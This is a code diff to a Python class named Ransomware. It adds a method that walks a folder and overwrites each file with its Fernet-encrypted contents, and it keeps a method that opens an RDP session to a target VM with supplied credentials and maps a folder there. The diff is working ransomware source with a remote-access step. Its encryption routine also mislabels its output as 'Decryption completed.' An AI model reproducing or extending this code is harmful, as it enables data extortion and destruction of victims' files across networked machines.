@@ -20,7 +20,7 @@ class Ransomware:
         self.key = load_key()
 
     # Encrypt all files in a folder on a different VM using RDP (rdesktop)
-    def encrypt_folder_on_vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
+    def Connectvm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
         rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
         subprocess.Popen(rdp_command, shell=True)
 
@@ -31,8 +31,21 @@ class Ransomware:
         encrypt_command = f'rdesktop {target_vm_ip} -u {rdp_username} -p {rdp_password} -r "disk:Shared={folder_path}" -a 16-bit -g 1024x768 -x l'
         subprocess.run(encrypt_command, shell=True)
 
-        print("Encryption completed on the target VM.")
+    def encrypt_folder(self, folder_path):
+            for root, dirs, files in os.walk(folder_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    with open(file_path, 'rb') as f:
+                        data = f.read()
 
+                    fernet = Fernet(self.key)
+                    encrypted = fernet.encrypt(data)
+
+                    with open(file_path, 'wb') as f:
+                        f.write(encrypted)
+
+            print("Decryption completed.")
+            
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder(self, folder_path):
         for root, dirs, files in os.walk(folder_path):
